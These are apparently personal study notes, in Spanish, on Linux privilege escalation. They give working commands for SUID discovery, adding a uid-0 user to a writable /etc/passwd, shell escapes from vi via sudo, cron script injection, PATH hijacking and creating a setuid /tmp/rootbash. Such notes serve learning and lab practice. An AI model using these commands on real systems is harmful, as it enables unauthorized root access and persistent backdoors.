Linenum:
https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

python -c "import pty;pty.spawn('/bin/bash')"

1)buscar explotar suid/guid files

buscar suid files:
find / -perm -u=s -type f 2>/dev/null
https://gtfobins.github.io/

2)explotar el /etc/passwd reescribible:

si el passwd file es reescribible por un user del que tenemos control, podemos crear un nuevo root

antes de agregar un user, se crea un hash con un salt

openssl passwd -1 -salt [salt] [password]

agregamos el user al listado del passwd:
username:passwordhash:0:0:root:/root:/bin/bash

3)escapando al VI

vemos los files que podemos realizar como sudo con "sudo -l"

LOS QUE DIGAN NOPASSWD PUEDEN CORRERSE COMO ROOT SIN INSERTAR PASS

luego de encontrarlo:
sudo "file"
una vez en el abrir una shell que será llamada como root: ":!sh"

4)Explotar el crontab
El CRON se usa para programar la ejecución de una app o comando.

el file se encuentra en /etc/crontab

Si alguno de los scripts del crontab que es corrido por el root puede ser modificado por un usuario en nuestro poder, podríamos aprovecharlo
para inyectar código y volvernos root

5) Explotar el PATH
Cuando encontramos un script que puede pertenece al root que corre algún comando (todo es un archivo en linux, 
con lo cual los comandos son evocaciones a un script) y que puede ser corrido por un user en nuestro poder
podemos ir a una carpeta donde tengamos permisos, crear un script con el mismo nombre del comando y luego cambiar el PATH del 
sistema para que, cuando el script sea corrido busque el comando creado por nosotros y no el original.

echo "/bin/bash" > "comando"

export PATH=/"carpeta":$PATH

corremos el script y como root ejecutará nuestro código malicioso.





conseguir una rootbash en un sh escribible:

cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash





